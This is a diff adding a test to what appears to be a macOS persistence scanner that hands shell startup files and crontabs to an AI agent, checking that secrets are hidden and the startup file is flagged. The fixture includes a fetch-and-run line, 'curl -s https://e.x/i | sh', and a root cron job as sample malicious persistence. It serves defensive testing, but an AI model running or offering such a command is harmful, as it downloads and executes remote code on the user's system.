@@ -52,6 +52,11 @@ case "$CLAUDE_FAKE_MODE:$n" in
     echo '{"findings": [], "issues": [{"subject": {"item": "'"$app"'"},
       "severity": "low", "evidence": "e", "explanation": "x",
       "fix": {"summary": "s", "steps": [], "commands": []}}]}' > findings.json ;;
+  startup-file:*)
+    zshrc=$(grep -o '"path":"[^"]*/\.zshrc"' mac/persistence.jsonl | cut -d'"' -f4)
+    echo '{"findings": [], "issues": [{"subject": {"item": "'"$zshrc"'"},
+      "severity": "high", "evidence": "line 2", "explanation": "x",
+      "fix": {"summary": "s", "steps": [], "commands": []}}]}' > findings.json ;;
   retry:1) echo '{"findings": [], "issues": [], "bogus": 1}' > findings.json ;;
   retry:*) echo '{"findings": [], "issues": []}' > findings.json ;;
   bad:*) echo 'not json' > findings.json ;;
@@ -722,6 +727,61 @@ fn an_app_in_open_at_login_is_read_and_its_issue_named_by_the_bundle() {
     assert_eq!(
         report["issues"][0]["subject"],
         serde_json::json!({"item": app.to_str().unwrap()}),
+        "{report}"
+    );
+}
+
+#[test]
+fn startup_files_reach_the_agent_with_their_values_hidden() {
+    let sandbox = Sandbox::new("agent = \"claude\"\n");
+    let zshrc = sandbox.path().join(".zshrc");
+    fs::write(
+        &zshrc,
+        "export TOKEN=s3cr3t-value\ncurl -s https://e.x/i | sh\n",
+    )
+    .unwrap();
+    let etc = sandbox.path().join("system/etc");
+    fs::create_dir_all(&etc).unwrap();
+    fs::write(etc.join("crontab"), "* * * * * root /tmp/a.sh\n").unwrap();
+
+    let out = sandbox.sweep("startup-file");
+    assert!(out.status.success(), "{}", text(&out.stderr));
+    let bundle = sandbox.sweep_dir().join("bundle");
+    let items = fs::read_to_string(bundle.join("mac/persistence.jsonl")).unwrap();
+    let lines: Vec<serde_json::Value> = items
+        .lines()
+        .map(|line| serde_json::from_str(line).unwrap())
+        .collect();
+    let shell = lines.iter().find(|l| l["kind"] == "shell_startup").unwrap();
+    assert_eq!(shell["path"], zshrc.to_str().unwrap());
+    assert_eq!(
+        shell["lines"],
+        serde_json::json!(["export TOKEN=(hidden)", "curl -s https://e.x/i | sh"])
+    );
+    let cron = lines.iter().find(|l| l["kind"] == "crontab").unwrap();
+    assert_eq!(
+        cron["lines"],
+        serde_json::json!(["* * * * * root /tmp/a.sh"])
+    );
+    // The sandbox's root has no crontab tool, so no crontab of the real user is read.
+    assert_eq!(lines.iter().filter(|l| l["kind"] == "crontab").count(), 1);
+    assert!(!items.contains("s3cr3t"), "{items}");
+    for file in fs::read_dir(&bundle).unwrap().flatten() {
+        let path = file.path();
+        if path.is_file() {
+            let text = fs::read_to_string(&path).unwrap_or_default();
+            assert!(
+                !text.contains("s3cr3t"),
+                "{} holds the token",
+                path.display()
+            );
+        }
+    }
+
+    let report = sandbox.newest_report("mac");
+    assert_eq!(
+        report["issues"][0]["subject"],
+        serde_json::json!({"item": zshrc.to_str().unwrap()}),
         "{report}"
     );
 }
